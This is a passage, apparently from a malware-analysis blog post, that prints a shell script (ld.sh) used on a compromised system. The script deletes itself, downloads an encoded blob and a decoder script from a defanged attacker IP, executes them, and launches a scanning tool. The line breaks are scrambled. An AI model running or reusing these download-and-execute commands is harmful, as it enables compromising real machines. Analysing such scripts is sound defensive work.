@@ -1,0 +1,14 @@
+
+Lan , a XOR-encoded data blob, and de.py , a Python script, to a temporary directory.
+This script then changes permissions and executes de.py , which subsequently decodes and decompresses piz.
+Lan .
+Finally, the script cleans up the initial staging files and executes scan.py , an additional script we will cover in more detail later in the post.
+#!/bin
+/sh rm $0 if [ !
+-f \"/var/python/bin/python2\" ]; then echo 'Exit' exit fi mkdir /tmp/rAgn cd /tmp/
+rAgn curl hxxp://45[.]120[.]53[.]214/piz.
+Lan -o piz.
+Lan sleep 1 curl hxxp://45[.]120[.]53[.]214/de
+-o de.py chmod 777 de.py /var/
+python/bin/python2 de.py rm de.py rm piz.
+Lan rm .new.zip cd httpd /var/python/bin/python2 scan.py -n 50 -N 40 & Figure 2: Contents of ld.sh, a shell-script to download additional tools to the compromised system piz.
